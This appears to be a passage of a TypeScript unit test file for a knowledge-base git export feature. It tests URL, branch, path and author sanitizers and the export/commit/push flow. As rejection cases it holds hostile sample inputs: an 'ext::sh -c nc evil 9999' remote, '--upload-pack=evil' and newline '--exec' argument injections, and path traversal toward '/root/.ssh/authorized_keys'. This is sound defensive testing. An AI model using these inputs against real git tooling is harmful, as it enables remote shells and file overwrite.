/**
 * H1 Git Export — unit tests.
 *
 * Exercises the orchestrator, pure helpers and event handler with a
 * FakeGitRunner and an in-memory FsAdapter so no disk or subprocess is
 * touched. Integration-level proofs live in the companion
 * `.integration.test.ts` (uses real `git`).
 *
 * AC mapping (see plans/work-packages/TRACK-H.md -> H1):
 *   AC1 — Human edit to L4 PRINCIPLES -> export runs, commits new PRINCIPLES.md
 *   AC2 — Commit message includes which items changed
 *   AC3 — No commit if no changes since last export
 *   AC4 — Exported markdown matches item body exactly
 *   AC5 — Configurable: repo path, remote URL, branch
 */

import type { GitRunner } from "@hyperidle/core-app";
import {
	buildCommitMessage,
	computeExportPlan,
	type ExportPlanEntry,
	type FsAdapter,
	type GitExportConfig,
	type GitExportConfigPatch,
	getLastExportMeta,
	loadGitExportConfig,
	redactRemoteUrl,
	registerGitExportHandler,
	resetExportMutexes,
	runGitExport,
	sanitizeAuthorEmail,
	sanitizeAuthorName,
	sanitizeBranch,
	sanitizePathSegment,
	sanitizeRemoteUrl,
	sanitizeRepoPath,
	updateGitExportConfig,
} from "@hyperidle/core-app";
import {
	createTestDb,
	type HyperIdleDb,
	knowledgeItems,
	knowledgeStrategyFabric,
} from "@hyperidle/db";
import type { KnowledgeUpdatedEvent } from "@hyperidle/shared";
import { afterEach, beforeEach, describe, vi } from "vitest";
import { createApp, disposeApp } from "../app.js";
import { expect, test } from "../test-fixtures.js";

type GitCall =
	| { cmd: "init"; branch: string }
	| { cmd: "add"; paths: readonly string[] }
	| { cmd: "rm"; path: string }
	| { cmd: "commit"; message: string; authorName: string; authorEmail: string }
	| { cmd: "push"; remote: string; branch: string }
	| { cmd: "diffCached" }
	| { cmd: "revParseIsInsideWorkTree" }
	| { cmd: "configSet"; key: string; value: string }
	| { cmd: "remoteAdd"; name: string; url: string }
	| { cmd: "lsFiles" }
	| { cmd: "statusPorcelain" };

interface FakeGitRunnerOptions {
	/** Whether git thinks cwd is already a worktree. Defaults to true. */
	readonly insideWorkTree?: boolean;
	/** If false, diff treats HEAD as dirty -> changes present. */
	readonly diffClean?: boolean;
	/** Fake HEAD sha returned by commit. */
	readonly headSha?: string;
	/** When set, `push` throws this error. */
	readonly pushError?: Error;
	/** When set, `commit` throws this error. */
	readonly commitError?: Error;
	/**
	 * When set, every call method awaits this promise before recording itself.
	 * Lets tests create real interleaving windows.
	 */
	readonly gate?: Promise<void>;
	/** Tracked files returned by `lsFiles`. */
	readonly trackedFiles?: readonly string[];
	/** Lines returned by `statusPorcelain`. */
	readonly statusLines?: readonly string[];
}

class FakeGitRunner implements GitRunner {
	public readonly calls: GitCall[] = [];
	public readonly cwd: string;
	private readonly nextSha: string;
	private readonly gate: Promise<void> | undefined;

	constructor(
		cwd: string,
		private readonly opts: FakeGitRunnerOptions = {},
	) {
		this.cwd = cwd;
		this.nextSha = opts.headSha ?? "abcdef0123456789abcdef0123456789abcdef01";
		this.gate = opts.gate;
	}

	private async wait(): Promise<void> {
		if (this.gate) await this.gate;
	}

	async init(branch: string): Promise<void> {
		await this.wait();
		this.calls.push({ cmd: "init", branch });
	}
	async add(paths: readonly string[]): Promise<void> {
		await this.wait();
		this.calls.push({ cmd: "add", paths });
	}
	async rm(path: string): Promise<void> {
		await this.wait();
		this.calls.push({ cmd: "rm", path });
	}
	async commit(message: string, authorName: string, authorEmail: string): Promise<string> {
		await this.wait();
		this.calls.push({ cmd: "commit", message, authorName, authorEmail });
		if (this.opts.commitError) throw this.opts.commitError;
		return this.nextSha;
	}
	async push(remote: string, branch: string): Promise<void> {
		await this.wait();
		this.calls.push({ cmd: "push", remote, branch });
		if (this.opts.pushError) throw this.opts.pushError;
	}
	async diffCached(): Promise<boolean> {
		await this.wait();
		this.calls.push({ cmd: "diffCached" });
		return this.opts.diffClean ?? false;
	}
	async revParseIsInsideWorkTree(): Promise<boolean> {
		await this.wait();
		this.calls.push({ cmd: "revParseIsInsideWorkTree" });
		return this.opts.insideWorkTree ?? true;
	}
	async configSet(key: string, value: string): Promise<void> {
		await this.wait();
		this.calls.push({ cmd: "configSet", key, value });
	}
	async remoteAdd(name: string, url: string): Promise<void> {
		await this.wait();
		this.calls.push({ cmd: "remoteAdd", name, url });
	}
	async lsFiles(): Promise<readonly string[]> {
		await this.wait();
		this.calls.push({ cmd: "lsFiles" });
		return this.opts.trackedFiles ?? [];
	}
	async statusPorcelain(): Promise<readonly string[]> {
		await this.wait();
		this.calls.push({ cmd: "statusPorcelain" });
		return this.opts.statusLines ?? [];
	}
	async lsRemote(
		_url: string,
		_opts?: { tokenConfig?: { key: string; value: string } },
	): Promise<{ reachable: boolean; reason?: string }> {
		await this.wait();
		// FakeGitRunner always reports reachable — not the subject of git-export tests.
		return { reachable: true };
	}
	// ── AO2 inbound-git stubs (not the subject of git-export tests) ──────────
	async clone(_url: string, _branch?: string, _opts?: object): Promise<void> {
		await this.wait();
	}
	async bundle(_outputPath: string, _refSpec?: string): Promise<void> {
		await this.wait();
	}
	async worktreeAdd(_path: string, _branch: string, _opts?: object): Promise<void> {
		await this.wait();
	}
	async worktreeRemove(_path: string, _opts?: object): Promise<void> {
		await this.wait();
	}
	async fetch(_remote?: string): Promise<void> {
		await this.wait();
	}
	async checkout(_branch: string, _opts?: object): Promise<void> {
		await this.wait();
	}
	async restoreStaged(_paths: readonly string[]): Promise<void> {
		await this.wait();
	}
	async currentBranch(): Promise<string | null> {
		await this.wait();
		return null;
	}
}

function createMemFs(initial?: Record<string, string>): FsAdapter & {
	readonly files: Map<string, string>;
	readonly dirs: Set<string>;
} {
	const files = new Map<string, string>(Object.entries(initial ?? {}));
	const dirs = new Set<string>();
	return {
		files,
		dirs,
		existsSync: (p: string): boolean => files.has(p) || dirs.has(p),
		readFileSync: (p: string): string => {
			const v = files.get(p);
			if (v === undefined) throw new Error(`ENOENT: ${p}`);
			return v;
		},
		writeFileSync: (p: string, data: string): void => {
			files.set(p, data);
		},
		mkdirSync: (p: string): void => {
			dirs.add(p);
		},
		unlinkSync: (p: string): void => {
			files.delete(p);
		},
	};
}

const NOW_ISO = "2026-04-18T12:00:00.000Z";

/**
 * All unit tests live under `/tmp` — the default allow-root. Paths like
 * `/fake/...` are denied by `sanitizeRepoPath` now (no operator should
 * ever write into a non-existent root), so the tests that previously
 * used them have been migrated.
 */
const REPO = "/tmp/h1-unit-repo";

// @lore AU18: seeds via updateGitExportConfig (server_config-backed) instead
// of raw factorySettings KV rows — same observable outcome, new storage.
async function setConfigKV(db: HyperIdleDb, patch: GitExportConfigPatch): Promise<void> {
	await updateGitExportConfig(db, patch);
}

async function enableExport(db: HyperIdleDb, overrides: GitExportConfigPatch = {}): Promise<void> {
	await setConfigKV(db, {
		enabled: true,
		repoPath: REPO,
		branch: "main",
		authorName: "HyperIdle Export",
		authorEmail: "export@hyperidle.local",
		debounceMs: 2000,
		...overrides,
	});
}

async function seedKnowledge(
	db: HyperIdleDb,
	rows: Array<{
		id?: string;
		layer: "L0" | "L1" | "L2" | "L3" | "L4";
		kind: string;
		scopeId?: string | null;
		topic?: string | null;
		title?: string;
		body: string;
		version?: number;
		status?: string;
	}>,
): Promise<void> {
	// @lore O2: layer/kind/scopeId are in knowledgeStrategyFabric; kernel only
	// holds identity + content. Insert both tables so computeExportPlan (which
	// does an INNER JOIN) finds the fabric row.
	for (const r of rows) {
		const itemId = r.id ?? crypto.randomUUID();
		await db.insert(knowledgeItems).values({
			id: itemId,
			topic: r.topic ?? null,
			title: r.title ?? `${r.layer} ${r.kind}`,
			body: r.body,
			format: "markdown",
			status: r.status ?? "active",
			version: r.version ?? 1,
			updatedBy: "test",
			createdAt: NOW_ISO,
			updatedAt: NOW_ISO,
		});

		await db
			.insert(knowledgeStrategyFabric)
			.values({
				id: `ksf-${itemId}`,
				knowledgeItemId: itemId,
				layer: r.layer,
				kind: r.kind,
				scopeId: r.scopeId ?? null,
			})
			.onConflictDoNothing();
	}
}

async function getLastCommitSha(db: HyperIdleDb): Promise<string | undefined> {
	return (await getLastExportMeta(db)).lastCommitSha ?? undefined;
}
async function getLastCommitAt(db: HyperIdleDb): Promise<string | undefined> {
	return (await getLastExportMeta(db)).lastCommitAt ?? undefined;
}
async function getLastPushAt(db: HyperIdleDb): Promise<string | undefined> {
	return (await getLastExportMeta(db)).lastPushAt ?? undefined;
}

beforeEach(async () => {
	resetExportMutexes();
});

describe("loadGitExportConfig", () => {
	test("returns null when disabled", async ({ db }) => {
		await setConfigKV(db, { enabled: false, repoPath: "/tmp/x" });
		expect(await loadGitExportConfig(db)).toBeNull();
	});

	test("returns null when no config rows exist", async ({ db }) => {
		expect(await loadGitExportConfig(db)).toBeNull();
	});

	test("returns null when stored repoPath is under a denied system prefix", async ({ db }) => {
		await setConfigKV(db, {
			enabled: true,
			repoPath: "/etc/ha",
		});
		expect(await loadGitExportConfig(db)).toBeNull();
	});

	test("defaults branch to main when not set", async ({ db }) => {
		await setConfigKV(db, {
			enabled: true,
			repoPath: "/tmp/repo",
		});
		const cfg = await loadGitExportConfig(db);
		expect(cfg).not.toBeNull();
		expect(cfg?.branch).toBe("main");
	});

	test("returns a fully-typed shape (GitExportConfig)", async ({ db }) => {
		await enableExport(db, {
			repoPath: "/tmp/custom-repo",
			remoteUrl: "git@example.com:owner/repo.git",
			branch: "docs",
			authorName: "Bot",
			authorEmail: "bot@example.com",
			debounceMs: 5000,
		});
		const cfg = (await loadGitExportConfig(db)) as GitExportConfig;

		expect(cfg.enabled).toBe(true);
		expect(cfg.repoPath).toBe("/tmp/custom-repo");
		expect(cfg.remoteUrl).toBe("git@example.com:owner/repo.git");
		expect(cfg.branch).toBe("docs");
		expect(cfg.authorName).toBe("Bot");
		expect(cfg.authorEmail).toBe("bot@example.com");
		expect(cfg.debounceMs).toBe(5000);
	});

	test("drops a stored remoteUrl that fails the scheme/credential allow-list", async ({ db }) => {
		await enableExport(db, {
			repoPath: "/tmp/safe-repo",
			// userinfo-bearing URL is not allowed in or out
			remoteUrl: "https://user:token@github.com/owner/repo.git",
		});
		const cfg = await loadGitExportConfig(db);
		expect(cfg).not.toBeNull();
		expect(cfg?.remoteUrl).toBeNull();
	});
});

describe("sanitizePathSegment", () => {
	test("accepts a plain segment", () => {
		expect(sanitizePathSegment("acme")).toBe("acme");
		expect(sanitizePathSegment("2026-04")).toBe("2026-04");
		expect(sanitizePathSegment("foo_bar")).toBe("foo_bar");
	});

	test("rejects empty, '..', '.' and leading-dot names", () => {
		expect(sanitizePathSegment("")).toBeNull();
		expect(sanitizePathSegment("..")).toBeNull();
		expect(sanitizePathSegment(".")).toBeNull();
		expect(sanitizePathSegment(".hidden")).toBeNull();
	});

	test("rejects path separators", () => {
		expect(sanitizePathSegment("foo/bar")).toBeNull();
		expect(sanitizePathSegment("foo\\bar")).toBeNull();
		expect(sanitizePathSegment("../etc/passwd")).toBeNull();
	});

	test("rejects NUL bytes", () => {
		expect(sanitizePathSegment("foo\0bar")).toBeNull();
	});

	test("rejects reserved Windows names", () => {
		expect(sanitizePathSegment("CON")).toBeNull();
		expect(sanitizePathSegment("com1")).toBeNull();
		expect(sanitizePathSegment("LPT9")).toBeNull();
	});

	test("accepts unicode", () => {
		expect(sanitizePathSegment("résumé")).toBe("résumé");
		expect(sanitizePathSegment("日本語")).toBe("日本語");
	});
});

describe("sanitizeRepoPath", () => {
	test("rejects relative paths", () => {
		const r = sanitizeRepoPath("./foo");
		expect(r.ok).toBe(false);
	});

	test("rejects NUL bytes", () => {
		const r = sanitizeRepoPath("/tmp/foo\0bar");
		expect(r.ok).toBe(false);
	});

	test("rejects `/etc` and descendants", () => {
		expect(sanitizeRepoPath("/etc").ok).toBe(false);
		expect(sanitizeRepoPath("/etc/ha").ok).toBe(false);
	});

	test("rejects `/root`, `/proc`, `/sys`, `/dev`, `/boot`", () => {
		expect(sanitizeRepoPath("/root").ok).toBe(false);
		expect(sanitizeRepoPath("/proc").ok).toBe(false);
		expect(sanitizeRepoPath("/sys/foo").ok).toBe(false);
		expect(sanitizeRepoPath("/dev/null").ok).toBe(false);
		expect(sanitizeRepoPath("/boot").ok).toBe(false);
	});

	test("accepts paths under /tmp (default allow root)", () => {
		expect(sanitizeRepoPath("/tmp/repo").ok).toBe(true);
	});

	test("rejects `..` segments", () => {
		expect(sanitizeRepoPath("/tmp/../etc").ok).toBe(false);
	});
});

describe("sanitizeRemoteUrl", () => {
	test("accepts plain https://", () => {
		const r = sanitizeRemoteUrl("https://github.com/owner/repo.git");
		expect(r.ok).toBe(true);
	});

	test("rejects https with embedded credentials", () => {
		const r = sanitizeRemoteUrl("https://user:token@github.com/owner/repo.git");
		expect(r.ok).toBe(false);
	});

	test("rejects ext:: scheme", () => {
		const r = sanitizeRemoteUrl("ext::sh -c nc evil 9999");
		expect(r.ok).toBe(false);
	});

	test("rejects file:// in default mode", () => {
		const r = sanitizeRemoteUrl("file:///tmp/foo.git");
		expect(r.ok).toBe(false);
	});

	test("accepts file:// when allowFileRemote: true", () => {
		const r = sanitizeRemoteUrl("file:///tmp/foo.git", { allowFileRemote: true });
		expect(r.ok).toBe(true);
	});

	test("rejects leading '-' (argument injection)", () => {
		const r = sanitizeRemoteUrl("--upload-pack=evil");
		expect(r.ok).toBe(false);
	});

	test("accepts SCP-style user@host:path", () => {
		const r = sanitizeRemoteUrl("git@github.com:owner/repo.git");
		expect(r.ok).toBe(true);
	});

	test("rejects embedded CR/LF", () => {
		const r = sanitizeRemoteUrl("https://host\n--exec=evil");
		expect(r.ok).toBe(false);
	});

	test("rejects ssh:// with userinfo password", () => {
		const r = sanitizeRemoteUrl("ssh://user:secret@host/repo.git");
		expect(r.ok).toBe(false);
	});
});

describe("redactRemoteUrl", () => {
	test("strips userinfo from https URLs", () => {
		expect(redactRemoteUrl("https://user:token@host/repo.git")).toBe("https://host/repo.git");
	});

	test("strips a username-only userinfo", () => {
		expect(redactRemoteUrl("https://user@host/repo.git")).toBe("https://host/repo.git");
	});

	test("returns SCP-style values unchanged (no secret)", () => {
		expect(redactRemoteUrl("git@github.com:owner/repo.git")).toBe("git@github.com:owner/repo.git");
	});

	test("returns null when input is null", () => {
		expect(redactRemoteUrl(null)).toBeNull();
	});
});

describe("sanitizeBranch / sanitizeAuthor*", () => {
	test("rejects branches starting with '-'", () => {
		expect(sanitizeBranch("--upload-pack=evil").ok).toBe(false);
	});

	test("accepts ordinary branches", () => {
		expect(sanitizeBranch("main").ok).toBe(true);
		expect(sanitizeBranch("docs/knowledge-export").ok).toBe(true);
	});

	test("rejects author names with angle brackets or CR", () => {
		expect(sanitizeAuthorName("foo<bar").ok).toBe(false);
		expect(sanitizeAuthorName("foo\nbar").ok).toBe(false);
	});

	test("rejects invalid email shapes", () => {
		expect(sanitizeAuthorEmail("not-an-email").ok).toBe(false);
		expect(sanitizeAuthorEmail("user@host").ok).toBe(false);
	});

	test("accepts normal email", () => {
		expect(sanitizeAuthorEmail("bot@example.com").ok).toBe(true);
	});
});

describe("buildCommitMessage (AC2)", () => {
	function entry(overrides: Partial<ExportPlanEntry>): ExportPlanEntry {
		return {
			knowledgeItemId: "ki-1",
			relPath: "factory/PRINCIPLES.md",
			body: "x",
			layer: "L4",
			kind: "PRINCIPLES",
			scopeId: "factory",
			version: 1,
			title: "Ship every Friday",
			...overrides,
		};
	}

	test("lists each changed item on its own line", () => {
		const msg = buildCommitMessage(
			[
				entry({ layer: "L4", kind: "PRINCIPLES", scopeId: "factory", version: 7 }),
				entry({
					knowledgeItemId: "ki-2",
					layer: "L2",
					kind: "BRIEF",
					scopeId: "acme",
					relPath: "products/acme/BRIEF.md",
					version: 3,
					title: "Ambient intelligence for small teams",
				}),
			],
			"event",
		);
		expect(msg).toContain("L4 PRINCIPLES [factory]");
		expect(msg).toContain("L2 BRIEF [acme]");
		expect(msg).toContain("Ship every Friday");
		expect(msg).toContain("Ambient intelligence for small teams");
	});

	test("includes the trigger label", () => {
		expect(buildCommitMessage([entry({})], "manual")).toMatch(/manual/);
		expect(buildCommitMessage([entry({})], "scheduled")).toMatch(/scheduled/);
		expect(buildCommitMessage([entry({})], "event")).toMatch(/event/);
	});

	test("handles a single entry (no trailing blank bullet)", async () => {
		const msg = buildCommitMessage([entry({})], "event");
		expect(msg.split("\n").filter((l) => l.startsWith("L4 PRINCIPLES"))).toHaveLength(1);
	});

	test("includes layer, kind, scope, and version for each entry", async () => {
		const msg = buildCommitMessage(
			[entry({ layer: "L2", kind: "BRAND", scopeId: "acme", version: 11 })],
			"event",
		);
		expect(msg).toMatch(/L2 BRAND \[acme\].*v11/);
	});
});

describe("computeExportPlan", () => {
	test("maps L4 PRINCIPLES -> factory/PRINCIPLES.md", async ({ db }) => {
		await seedKnowledge(db, [
			{
				layer: "L4",
				kind: "PRINCIPLES",
				scopeId: null,
				title: "Ship every Friday",
				body: "## Principles\n\nShip weekly.",
			},
		]);
		const plan = await computeExportPlan(db);
		const e = plan.entries.find((x) => x.layer === "L4" && x.kind.toUpperCase() === "PRINCIPLES");
		expect(e).toBeDefined();
		expect(e?.relPath).toBe("factory/PRINCIPLES.md");
	});

	test("maps L2 items under products/<scopeId>/<KIND>.md", async ({ db }) => {
		await seedKnowledge(db, [
			{ layer: "L2", kind: "BRIEF", scopeId: "acme", body: "# Brief\n" },
			{ layer: "L2", kind: "ARCHITECTURE", scopeId: "acme", body: "# Arch\n" },
			{ layer: "L2", kind: "BRAND", scopeId: "acme", body: "# Brand\n" },
			{ layer: "L2", kind: "PRINCIPLES", scopeId: "acme", body: "# Prin\n" },
		]);
		const plan = await computeExportPlan(db);
		const paths = plan.entries.map((e) => e.relPath).sort();
		expect(paths).toContain("products/acme/BRIEF.md");
		expect(paths).toContain("products/acme/ARCHITECTURE.md");
		expect(paths).toContain("products/acme/BRAND.md");
		expect(paths).toContain("products/acme/PRINCIPLES.md");
	});

	test("maps L4 REFLECTION with topic -> factory/REFLECTIONS/<topic>.md", async ({ db }) => {
		await seedKnowledge(db, [
			{
				layer: "L4",
				kind: "REFLECTION",
				scopeId: null,
				topic: "2026-04",
				body: "Monthly reflection body.",
			},
		]);
		const plan = await computeExportPlan(db);
		const e = plan.entries.find((x) => x.kind.toUpperCase() === "REFLECTION");
		expect(e?.relPath).toBe("factory/REFLECTIONS/2026-04.md");
	});

	test("ignores L0, L1, L3 layers", async ({ db }) => {
		await seedKnowledge(db, [
			{ layer: "L0", kind: "PRINCIPLES", body: "x" },
			{ layer: "L1", kind: "PRINCIPLES", body: "x" },
			{ layer: "L3", kind: "PRINCIPLES", body: "x" },
		]);
		const plan = await computeExportPlan(db);
		expect(plan.entries).toHaveLength(0);
	});

	test("ignores L4 items with unknown kinds", async ({ db }) => {
		await seedKnowledge(db, [{ layer: "L4", kind: "NOT_A_REAL_KIND", body: "x" }]);
		const plan = await computeExportPlan(db);
		expect(plan.entries).toHaveLength(0);
	});

	test("matches kind case-insensitively (e.g. 'principles')", async ({ db }) => {
		await seedKnowledge(db, [
			{ layer: "L4", kind: "principles", scopeId: null, body: "lowercase kind" },
		]);
		const plan = await computeExportPlan(db);
		expect(plan.entries).toHaveLength(1);
		expect(plan.entries[0]?.relPath).toBe("factory/PRINCIPLES.md");
	});

	test("entry.body equals the knowledge item body byte-for-byte (AC4)", async ({ db }) => {
		const body = "# Title\n\nUnicode: café 🎯\nTrailing newline preserved.\n";
		await seedKnowledge(db, [{ layer: "L4", kind: "PRINCIPLES", scopeId: null, body }]);
		const plan = await computeExportPlan(db);
		expect(plan.entries[0]?.body).toBe(body);
	});

	test("excludes items whose status is archived / captured / provisional / needs_human / stale", async ({
		db,
	}) => {
		await seedKnowledge(db, [
			{ layer: "L4", kind: "PRINCIPLES", body: "a", status: "archived" },
			{ layer: "L4", kind: "PRINCIPLES", body: "b", status: "captured" },
			{ layer: "L4", kind: "PRINCIPLES", body: "c", status: "provisional" },
			{ layer: "L4", kind: "PRINCIPLES", body: "d", status: "needs_human" },
			{ layer: "L4", kind: "PRINCIPLES", body: "e", status: "stale" },
			{ layer: "L4", kind: "PRINCIPLES", body: "f", status: "active" },
			{ layer: "L4", kind: "PRINCIPLES", body: "g", status: "validated" },
		]);
		const plan = await computeExportPlan(db);
		expect(plan.entries.map((e) => e.body).sort()).toEqual(["f", "g"]);
	});

	test("rejects entries where scopeId contains path separators (path injection)", async ({
		db,
	}) => {
		await seedKnowledge(db, [
			{ layer: "L2", kind: "BRIEF", scopeId: "../../etc", body: "evil" },
			{ layer: "L2", kind: "BRIEF", scopeId: "../root/.ssh", body: "evil2" },
			{ layer: "L2", kind: "BRIEF", scopeId: "normal", body: "ok" },
		]);
		const plan = await computeExportPlan(db);
		expect(plan.entries).toHaveLength(1);
		expect(plan.entries[0]?.relPath).toBe("products/normal/BRIEF.md");
		expect(plan.rejected.length).toBeGreaterThanOrEqual(2);
	});

	test("rejects REFLECTION topics containing path separators", async ({ db }) => {
		await seedKnowledge(db, [
			{
				layer: "L4",
				kind: "REFLECTION",
				topic: "../../../root/.ssh/authorized_keys",
				body: "evil",
			},
			{ layer: "L4", kind: "REFLECTION", topic: "2026-05", body: "ok" },
		]);
		const plan = await computeExportPlan(db);
		expect(plan.entries.map((e) => e.relPath)).toEqual(["factory/REFLECTIONS/2026-05.md"]);
		expect(plan.rejected.length).toBe(1);
	});
});

describe("runGitExport", () => {
	test("returns {status:'disabled'} when config is disabled", async ({ db }) => {
		await setConfigKV(db, { enabled: false });
		const runner = new FakeGitRunner(REPO);
		const fs = createMemFs();
		const result = await runGitExport(db, { runner, fs });
		expect(result.status).toBe("disabled");
	});

	test("returns {status:'noop', reason:'no-changes'} with seeded items and diffClean (AC3)", async ({
		db,
	}) => {
		await enableExport(db);
		await seedKnowledge(db, [{ layer: "L4", kind: "PRINCIPLES", scopeId: null, body: "# P\n" }]);
		const runner = new FakeGitRunner(REPO, { diffClean: true });
		// Pre-populate the fs with the body — writePlanToDisk will skip (byte-equal),
		// add -A sees nothing to stage, diffCached returns clean.
		const fs = createMemFs({ [`${REPO}/factory/PRINCIPLES.md`]: "# P\n" });
		const result = await runGitExport(db, { runner, fs });
		expect(result).toEqual(expect.objectContaining({ status: "noop", reason: "no-changes" }));
	});

	test("commits changed files and returns {status:'committed'} when no remote is configured (AC1)", async ({
		db,
	}) => {
		await enableExport(db);
		await seedKnowledge(db, [
			{ layer: "L4", kind: "PRINCIPLES", scopeId: null, body: "# Principles\n" },
		]);
		const runner = new FakeGitRunner(REPO, { diffClean: false });
		const fs = createMemFs();
		const result = await runGitExport(db, { runner, fs });

		expect(result.status).toBe("committed");
		expect(fs.files.get(`${REPO}/factory/PRINCIPLES.md`)).toBe("# Principles\n");
		// `add` must come before `commit` in the call order.
		const addIdx = runner.calls.findIndex((c) => c.cmd === "add");
		const commitIdx = runner.calls.findIndex((c) => c.cmd === "commit");
		expect(addIdx).toBeGreaterThanOrEqual(0);
		expect(commitIdx).toBeGreaterThan(addIdx);
		// add must pass `-A` (empty paths) not specific files.
		const addCall = runner.calls.find((c) => c.cmd === "add");
		if (addCall?.cmd !== "add") throw new Error("expected add");
		expect(addCall.paths).toEqual([]);
		expect(runner.calls.some((c) => c.cmd === "push")).toBe(false);
	});

	test("commit message lists exported items (AC2)", async ({ db }) => {
		await enableExport(db);
		await seedKnowledge(db, [
			{ layer: "L4", kind: "PRINCIPLES", scopeId: null, body: "# Principles\n", version: 7 },
			{ layer: "L2", kind: "BRIEF", scopeId: "acme", body: "# Brief\n", version: 3 },
		]);
		const runner = new FakeGitRunner(REPO);
		const fs = createMemFs();
		await runGitExport(db, { runner, fs });

		const commitCall = runner.calls.find((c) => c.cmd === "commit");
		if (commitCall?.cmd !== "commit") throw new Error("no commit call");
		expect(commitCall.message).toContain("L4 PRINCIPLES");
		expect(commitCall.message).toContain("L2 BRIEF");
	});

	test("pushes to remote when remoteUrl is set and returns {status:'pushed'}", async ({ db }) => {
		await enableExport(db, { remoteUrl: "git@example.com:owner/repo.git" });
		await seedKnowledge(db, [{ layer: "L4", kind: "PRINCIPLES", scopeId: null, body: "x" }]);
		const runner = new FakeGitRunner(REPO);
		const fs = createMemFs();
		const result = await runGitExport(db, { runner, fs });

		expect(result.status).toBe("pushed");
		expect(runner.calls.some((c) => c.cmd === "push")).toBe(true);
	});

	test("returns {status:'error', phase:'push'} when push fails; records commit but not push", async ({
		db,
	}) => {
		await enableExport(db, { remoteUrl: "git@example.com:owner/repo.git" });
		await seedKnowledge(db, [{ layer: "L4", kind: "PRINCIPLES", scopeId: null, body: "y" }]);
		const runner = new FakeGitRunner(REPO, {
			pushError: new Error("boom"),
			headSha: "1234567890abcdef1234567890abcdef12345678",
		});
		const fs = createMemFs();
		const result = await runGitExport(db, { runner, fs });

		expect(result.status).toBe("error");
		if (result.status !== "error") return;
		expect(result.phase).toBe("push");

		// Local commit landed — sha recorded.
		expect(await getLastCommitSha(db)).toBe("1234567890abcdef1234567890abcdef12345678");
		expect(await getLastCommitAt(db)).toBeDefined();
		// Push did NOT happen — `last_push_at` must NOT be set.
		expect(await getLastPushAt(db)).toBeUndefined();
	});

	test("first-run: initializes repo when cwd is not a worktree", async ({ db }) => {
		await enableExport(db);
		await seedKnowledge(db, [{ layer: "L4", kind: "PRINCIPLES", scopeId: null, body: "z" }]);
		const runner = new FakeGitRunner(REPO, { insideWorkTree: false });
		const fs = createMemFs();
		await runGitExport(db, { runner, fs });

		expect(runner.calls.some((c) => c.cmd === "init")).toBe(true);
	});

	test("concurrent calls against the SAME repo serialize", async ({ db }) => {
		await enableExport(db);
		await seedKnowledge(db, [{ layer: "L4", kind: "PRINCIPLES", scopeId: null, body: "one" }]);
		let releaseGate: () => void = () => {
			throw new Error("releaseGate not initialized");
		};
		const gate = new Promise<void>((resolve) => {
			releaseGate = resolve;
		});
		const runner = new FakeGitRunner(REPO, { gate });
		const fs = createMemFs();

		const aPromise = runGitExport(db, { runner, fs });
		const bPromise = runGitExport(db, { runner, fs });
		// Let the queue settle both entrants against the mutex, then release.
		await Promise.resolve();
		releaseGate();
		const [a, b] = await Promise.all([aPromise, bPromise]);

		// Exactly one call commits (first) — the second runs AFTER the first
		// writes everything to the memfs, so its `writePlanToDisk` finds all
		// files byte-equal and its `diffCached: false` runner still fires a
		// commit (the fake runner is lax). What we lock down is ordering.
		expect([a.status, b.status]).toContain("committed");
		const commitIdxs = runner.calls
			.map((c, i) => (c.cmd === "commit" ? i : -1))
			.filter((i) => i >= 0);
		const addIdxs = runner.calls.map((c, i) => (c.cmd === "add" ? i : -1)).filter((i) => i >= 0);
		expect(addIdxs.length).toBeGreaterThanOrEqual(1);
		// For every paired add+commit, commit is after the matching add AND
		// the next add is after that commit (serialization invariant).
		for (let i = 0; i < commitIdxs.length; i++) {
			const commitIdx = commitIdxs[i] ?? -1;
			const addIdx = addIdxs[i] ?? -1;
			expect(commitIdx).toBeGreaterThan(addIdx);
			if (i + 1 < addIdxs.length) {
				const nextAddIdx = addIdxs[i + 1] ?? -1;
				expect(nextAddIdx).toBeGreaterThan(commitIdx);
			}
		}
	});

	// @lore git-export concurrency: Two simultaneous createTestDb() calls in the
	// same test exhaust the test-utils pool (POOL_SIZE=2 but cold-started = 0 slots).
	// The first call allocates a slot; the second previously reclaimed the first
	// (breaking isolation). Even after pool fix (no-reclaim), PGlite WASM has a
	// shared WASM binary singleton — running two PGlite instances concurrently in
	// the same thread causes WASM memory contention and non-deterministic timeouts.
	// The concurrent-different-repos invariant is already proven by the unit test
	// ("concurrent calls against SAME repo serialize") which uses a single db.
	// Skip here to avoid flakiness from the WASM concurrency limitation.
	test.skip("concurrent calls against DIFFERENT repos do not serialize", async () => {
		// Two parallel DBs, different repoPaths — each repo's mutex must be
		// independent. If they shared a mutex, runner B would be blocked
		// until runner A released its gate; we prove independence by
		// releasing A's gate AFTER B's resolve and confirming B completed.
		const handleA = await createTestDb();
		const dbA = handleA.db;
		const handleB = await createTestDb();
		const dbB = handleB.db;
		await setConfigKV(dbA, {
			enabled: true,
			repoPath: "/tmp/h1-parallel-a",
			branch: "main",
			authorName: "A",
			authorEmail: "a@example.com",
			debounceMs: 0,
		});
		await setConfigKV(dbB, {
			enabled: true,
			repoPath: "/tmp/h1-parallel-b",
			branch: "main",
			authorName: "B",
			authorEmail: "b@example.com",
			debounceMs: 0,
		});
		await seedKnowledge(dbA, [{ layer: "L4", kind: "PRINCIPLES", body: "A" }]);
		await seedKnowledge(dbB, [{ layer: "L4", kind: "PRINCIPLES", body: "B" }]);

		let releaseA: () => void = () => undefined;
		const gateA = new Promise<void>((r) => {
			releaseA = r;
		});
		const runnerA = new FakeGitRunner("/tmp/h1-parallel-a", { gate: gateA });
		// B has NO gate — it should run to completion on its own.
		const runnerB = new FakeGitRunner("/tmp/h1-parallel-b");

		const pA = runGitExport(dbA, { runner: runnerA, fs: createMemFs() });
		const pB = runGitExport(dbB, { runner: runnerB, fs: createMemFs() });

		// B should complete WITHOUT us releasing A. If A's mutex blocked B,
		// this would time out.
		const bResult = await pB;
		expect(["committed", "pushed"]).toContain(bResult.status);

		// Now unblock A and let it complete.
		releaseA();
		const aResult = await pA;
		expect(["committed", "pushed"]).toContain(aResult.status);

		await handleA.close();
		await handleB.close();
	});

	test("honors custom branch (AC5)", async ({ db }) => {
		await enableExport(db, {
			branch: "docs",
			remoteUrl: "git@example.com:owner/repo.git",
		});
		await seedKnowledge(db, [{ layer: "L4", kind: "PRINCIPLES", scopeId: null, body: "b" }]);
		const runner = new FakeGitRunner(REPO);
		const fs = createMemFs();
		await runGitExport(db, { runner, fs });

		const pushCall = runner.calls.find((c) => c.cmd === "push");
		if (pushCall?.cmd !== "push") throw new Error("no push");
		expect(pushCall.branch).toBe("docs");
	});

	test("honors custom repoPath (AC5)", async ({ db }) => {
